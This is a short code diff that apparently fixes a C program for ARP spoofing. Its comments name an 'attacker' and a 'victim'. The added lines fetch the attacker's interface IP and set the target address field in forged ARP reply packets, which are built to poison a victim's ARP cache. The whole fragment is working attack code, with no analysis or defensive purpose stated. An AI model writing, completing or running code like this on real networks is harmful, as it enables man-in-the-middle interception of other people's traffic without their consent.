@@ -86,6 +86,7 @@ struct arphdr {
 		}
 
 		// get attacker's ip address
+	        ioctl(fd, SIOCGIFADDR, &ifr2);
 		attacker_ip=inet_ntoa(((struct sockaddr_in *) &ifr2.ifr_addr)->sin_addr);
 
 		// make arp request frame to get victim's mac address
@@ -139,6 +140,8 @@ struct arphdr {
 			printf("+");
 			arphdr -> opcode =htons(2);
 			inet_pton(AF_INET, target_ip, arphdr->sender_ip);
+			inet_pton(AF_INET, sender_ip, arphdr->target_ip);
+		
 			memcpy(arphdr->sender_mac, mac, 6);
 			memcpy(arphdr->target_mac, tmac, 6);
 			int l;
